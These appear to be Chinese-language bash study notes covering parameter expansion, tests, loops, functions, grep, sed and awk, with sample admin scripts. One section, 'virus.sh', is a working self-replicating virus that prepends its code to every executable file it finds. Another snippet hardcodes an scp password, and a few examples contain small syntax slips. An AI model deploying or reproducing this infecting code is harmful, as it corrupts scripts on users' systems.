1、设置变量
LOCALTEST=“test”
readonly LOCALTEST=“test”设置只读变量

截取字符串的长度
var=“1234567890”
echo ${#var}

${var+value}:如果设置了var，则返回value；如果未设置，则返回空
${var-value}:如果没有设置var，则返回value；如果设置了var，则返回var；
${var=value}:如果未设置var，则设置为value并显示。如果设置了则显示原来的值
${var?value}:如果未设置var，则显示错误信息value

${var#str}、${var##str}:返回从变量左边去掉最短、最长匹配str的字符串
${var%str}、${var%%str}:返回从变量右边去掉最短、最长匹配str的字符串
例如：meta_123_V3、meta-1234_V3、meta12345_V3目录，重命名为去掉前缀meta、后缀_V3：
ls|grep meta|xargs -I file sh -c 'a=file;b=${a#meta};mv file ./${b%_V3}'

在bash 2中：
${var:pos}:表示去掉变量var的前pos个字符
${var:pos:len}:表示去掉变量var的前pos个字符后，取剩余字符串的前len个字符
${var/str/replacestr}:表示将变量中出现的第一个str替换为replacestr
${var//str/replacestr}:表示将变量中出现的所有str替换为replacestr

例如：meta_123_V3、meta-1234_V3、meta12345_V3目录，重命名为大写的META：
ls|grep meta|xargs -I file sh -c 'a=file;b=${a/meta/META};mv file ${b}'

unset var：清除变量

位置变量：$0,$1,$2...$9（$0代表脚本名字）
特殊变量：
$#,参数个数
$*,以一个单字符串显示所有向脚本传递的参数，此参数可超过9个。
$@，使用时用引号，和$*作用类似，但更安全
$$，脚本运行的当前进程id
$!，后台运行的最后一个进程的id
$?，显示最后命令的退出状态，0表示没有错误，其它任何值表示有错误。

shift n：移动参数位置

":双引号可以引用除$、`外的任意字符，即$、`有其特殊含义
':单引号忽略任何引用值，即屏蔽所有字符的特殊含义

echo -e "ert,$SHELL.\n*`echo chinaitlab.`"  #-e表示对\n进行转义
echo -n “First name is：" #-n表示回车但不换行，echo默认是回车换行的


变量赋值时，=前后都不能有空格
bash脚本中语句结尾不需要；
除了变量赋值和for循环头中，变量使用时需要在前面加$


2、let（可以不需要$符号，直接对变量进行算数运算）和expr都不支持浮点；bc（精密计算）
整数运算一般通过let和expr来实现：let "x=$x+1"或者x=`expr $x + 1` (注意空格)
表达式res=`expr $i \* $j`的两边的空格不能省，否则会成为字符串的连接，乘法的时候需要用\转义。

expr效率最慢

二进制、十进制相互转换
#!/bin/bash

no1=100 #10进制数据
no2=1100100  #2进制数据

result1=`echo "obase=2;$no1" |bc`
result2=`echo "obase=10;ibase=2;$no2" |bc`

echo $result1
echo $result2

转换后的进制obase在前面

整数比较：
-eq:  =
-ne:  !=
-gt:   >
-ge:  >=
-lt:    <
-le:   <=

字符串比较：
是否相同：if [ $a = $b ]
是否不相同：if [ $a != $b ]
为空：if [ -z $a ]
不为空：if [ -n $a ]，尽量用if [ !-z $a ]来表示

逻辑操作：
!：取反
-a：and
-o：or

文件操作：
-d：对象存在且为目录，则返回真
-f：对象存在且为文件，则返回真
-L：对象存在且为符号链接，则返回真
-r：对象存在且可读，则返回真
-s：对象存在且长度非0，则返回真
-w：对象存在且可写，则返回真
-x：对象存在且可执行，则返回真





3、流程控制
if [ expression1 -a expression 2]
then 
statements
fi


if [ expression ]
then
statements
else
statements
fi

if [ expression ]
then
statements
elif [ expression ]
then
statements
else
statements
fi

如果将if [ expression ]和then写在一行，则必须if  [ expression ];then

for day in Sun Mon Tue Wed Thu Fri Sat
do
echo $day
done

for i in {1..10}
do
statement
done

while [ condition ]   #while :或while ["1"]表示死循环
do
statements
done

while read line
do
echo $line
done <test.txt   #从test.txt文件读取

until [ condition is TRUE ]
do
statements
done

case:
case "$var" in
condition1 | condition 2) statements;;
condition3) statements;;
...
*) statements;;
esac

#!/bin/bash
echo "hit a key,then hit enter."
read input
case "$input" in
[a-z]) echo "lowercase letter.";;
[A-Z]) echo "Uppercase letter.";;
[0-9]) echo "digital num.";;
*) echo "invalid char.";;
esac

break 、continue


例子：99乘法表
#/bin/bash
i=1
while (($i<=9))  #注意有两个括号
do
j=1
while (($j<=$i))
do
let res=$j*$i
printf "%d X %d =%d  " $j $i $res
let j++
done
printf "\n"
let i++
done

4、函数的使用
function my_func
{
some code here
}
或者
my_func()
{
some code here
}

随机数函数：
#!/bin/bash
rand()
{
min=$1
max=$(($2-$min+1))   #max=`expr $2 - $min + 1`
num=$(head -n 10 /dev/urandom|cksum|cut -f 1 -d ' ')  #awk -F '  ' '{print $1}'
##或者num=$(date +%s%N)   #num=`date +%s%N`
echo $(($num%$max+$min))
}
rand 100 500


#生成10位随机字符串
date +%s%N |md5sum| head -c 10
或者head -n 10 /dev/urandom|md5sum|head -c 10

5、select
#!/bin/bash
OPTIONS="Hello Quit"
select opt in $OPTIONS
do
if [ "$opt" == "Hello" ]
then
echo hello
else [ "$opt" == "Quit" ] #注意括号里面的空格
echo goodbye
exit
fi
done

6、grep
^:匹配行首
$:匹配行尾
.:匹配单字符
^$：匹配空行
^.$：匹配一个字符的行
[^a-zA-Z0-9]:非数字非字母中的一个

[[:lower:]] 等价[a-z]
[[:upper:]] 等价[A-Z]
[[:alpha:]]  等价[a-zA-Z]
[[:digit:]]  等价[0-9]
[[:alnum:]] 等价[a-zA-Z0-9]
[[:space:]] 等价空格或Tab

grep "^[^210]" grep.txt  #第一个^表示开头，第二个^表示非
grep "A\{2\}B" grep.txt   #表示AAB
A\{2\}B：A出现2次，AAB匹配
A\{4,\}B：A最少出现4次，AAAAB匹配
A\{2,4\}B：A出现2-4次，AAB、AAAB、AAAAB都匹配

-i：不区分大小写
-v：不包含
-n：显示行号:内容



7、sed
i：在指定行的前面插入内容
a：在指定行的后面插入内容
d：删除指定的行
p：在屏幕打印出指定的行
c：替代行
-i：直接修改文档内容而不打印输出
-n：打印匹配的行


sed基本编辑命令
p：打印匹配行
=：显示文件行号
i\： 在匹配行的前面插入
a\：在匹配行的后面插入
c\：用新文本替换匹配文本
s：模式替换文本
d：删除匹配行
r：从另一个文件中读文本
w：写文本到一个文件

[root@oracle ~]# sed '/zjd/i\gz' awk.txt
id      name    score
gz
1       zjd      89
2       zjh      65
3       ftw      88

sed -n '1p'  打印第一行
sed -n '2,4p' 打印2-4行
sed -n '/str/p'  打印包含str的行
sed -n '/^$/=' awk.txt  打印空白行的行号
sed -i '/zjd/i\gz' awk.txt   i\在匹配行的前面插入
sed -i '/zjd/a\gz' awk.txt  a\在匹配行的后面插入
sed -i '/zjd/c\zhongjd' awk.txt c\把匹配行替换成zhongjd
sed -i '/^$/d' awk.txt 删除awk.txt中的所有空白行

sed 's/str/newstr/g'  test.txt    屏幕打印输出test.txt的内容，其中str替换为newstr
sed -i 's/str/newstr/g' test.txt   直接修改test.txt中的内容，替换str为newstr
sed -i 's/zjd/hello &/' awk.txt  把匹配行中的zjd前面加一个hello 字符串
sed -i 's/zjd/& hello/' awk.txt  把匹配行中的zjd后面加一个 hello字符串
sed '2,$d' test.txt  删除第二行到最后一行的内容
sed '$d' test.txt   删除最后一行的内容


ifconfig eth0 |grep 'inet addr'|sed 's/^.*addr://'|sed 's/Bcast.*$//'  输出网卡ip

8、awk
NF：Now Field
NR：Now Row
FS：String分隔符
~/str/：匹配str
!~/str/：不匹配str

awk '条件1{动作1;动作2;}  条件2{printf "sth."}......'  #printf中的内容用双引号

awk.txt
id      name    score
1       zjd      89
2       zjh      65
3       ftw      88

awk '{if ($0 ~/zj/) print $0}' awk.txt
awk '{if ($0 !~/zj/) print $0}' awk.txt
awk '{if ($2=="zjd") print $0}' awk.txt

9、sort
-c   检查文件是否已排序
-m  合并两个分类文件
-u   合并重复行并排序
-o
-t
+n
n
-r


10、uniq（只能统计邻近的行是否重复，要想统计所有行是否重复，可以先sort再uniq）
-u  显示不重复的行
-d  显示重复的行
-c   打印每行出现的次数（重复行显示为一行）
-f 2  前面2列将被忽略

4、shell病毒，感染其它脚本文件
virus.sh
#!/bin/bash
#Virus by ijse start
#=====Your Code Here=========
echo "!This file has been infected by CpVirus written by ijse."
echo "!You can remove the virus code by editing this file."
echo "!Just remove the lines between '#Virus by ijse start' and '#Virus by ijseend'."
#============================
for exfile in `find ./ -executable -type f`;
do
tmpFile=$exfile\.tmp
firstLine=`head -2 $exfile|tail -1`
if [ "$firstLine" != "#Virus by ijse start" ]; then
endnum=`grep -n -x "#Virus by ijse end" $0 | awk -F":" '{print $1}'`
startnum=`grep -n -x "#Virus by ijse start" $0 | awk -F":" '{print $1}'`
let length=$endnum-$startnum+1
echo "`head -$endnum $0|tail -$length`" > $tmpFile
cat $exfile >> $tmpFile
chmod u+x $tmpFile
rm $exfile
mv $tmpFile $exfile
fi
done
#Virus by ijse end

5、查看网卡流量
traff.sh
#!/bin/bash
while [ "1" ]
do
eth=$1
RXpre=$(cat /proc/net/dev | grep $eth | tr : " " | awk '{print $2}')
TXpre=$(cat /proc/net/dev | grep $eth | tr : " " | awk '{print $10}')
sleep 1
RXnext=$(cat /proc/net/dev | grep $eth | tr : " " | awk '{print $2}')
TXnext=$(cat /proc/net/dev | grep $eth | tr : " " | awk '{print $10}')
clear
echo -e "\t RX `date +%k:%M:%S` TX"
RX=$((${RXnext}-${RXpre}))
TX=$((${TXnext}-${TXpre}))
if [[ $RX -lt 1024 ]];then
RX="${RX}B/s"
elif [[ $RX -gt 1048576 ]];then
RX=$(echo $RX | awk '{print $1/1048576 "MB/s"}')
else
RX=$(echo $RX | awk '{print $1/1024 "KB/s"}')
fi
if [[ $TX -lt 1024 ]];then
TX="${TX}B/s"
elif [[ $TX -gt 1048576 ]];then
TX=$(echo $TX | awk '{print $1/1048576 "MB/s"}')
else
TX=$(echo $TX | awk '{print $1/1024 "KB/s"}')
fi
echo -e "$eth \t $RX $TX "
done


6、脚本除错
sh -x strangescript
上述命令会执行该脚本，同时显示所有变量的值。
shell还有一个不执行脚本只检查语法的模式，命令如下：
? sh -n your_script
这个命令会返回所有语法错误。


7、在meta-1234_V3、meta_123456_V3、meta12306_V3、meta*122_V3目录中创建test.txt文件
for i in `echo meta*`;do touch ./$i/test.txt;done;
for i in `ls|grep meta`;do touch ./$i/test4.txt;done;
ls |grep meta|xargs -I file touch ./file/test.txt

meta_123_V3、meta-1234_V3、meta12345_V3目录，重命名为大写的META：
ls|grep meta|xargs -I file sh -c 'a=file;b=${a/meta/META};mv file ${b}'


8、获取命令行参数：shift、getopts
#!/bin/bash
ALL=false
HELP=false

while getopts ahc: OPTION
do
        case $OPTION in
        a)ALL=true
        echo "ALL is $ALL"
        ;;
        h)HELP=true
        echo "HELP is $Help"
        ;;
        c)c=$OPTARG
        echo "c is $c"
        ;;
        \?)echo "`basename $0` -[ah] -c value"
        ;;
        esac
done


sendsystem(){
expect -c "
           set timeout -1
           spawn scp $ORACLE_BASE/oradata/$ORACLE_SID/system01.dbf oracle@$S_IP:$ORACLE_BASE/oradata/standby/
           expect {
               yes/no { send \"yes\r\"; exp_continue }
               *assword* { send \"oracle\r\" }
           };
           expect 100%
           expect eof ;
       "
}

rsync -av source_dir --exclude=core user@remote:<DIR>



nginx监控脚本,就关掉或者杀死keepalived进程。
#!/bin/bash  
while  :  
do  
nginxpid=`ps -C nginx --no-header | wc -l`  
 if [ $nginxpid -eq 0 ];then  
  /usr/local/webserver/nginx/sbin/nginx  
  sleep 5  
nginxpid=`ps -C nginx --no-header | wc -l`  
  echo $nginxpid  
    if [ $nginxpid -eq 0 ];then  
 /etc/init.d/keepalived stop  
   fi  
 fi  
 sleep 5  
done 


#!/bin/bash   
#变量定义  
ip_array=("192.168.1.1" "192.168.1.2" "192.168.1.3")  
user="test1"  
remote_cmd="/home/test/1.sh"  
  
#本地通过ssh执行远程服务器的脚本  
for ip in ${ip_array[*]}  
do  
	if [ $ip = "192.168.1.1" ]; then  
		port="7777"  
	else  
		port="22"  
	fi  
	ssh -t -p $port $user@$ip "remote_cmd"  
done  




数组中"和@的妙用

#!/bin/bash
list=(
4k
"8k a bit"
"16k abc"
"32k gold"
64k
)
for i in "${list[@]}"
do 
echo $i
done



while echo -n "请输入你最喜欢的电影：";read film
do
echo "$film确实是一部好电影。"
done



while read line 
do
echo $line
done <read.txt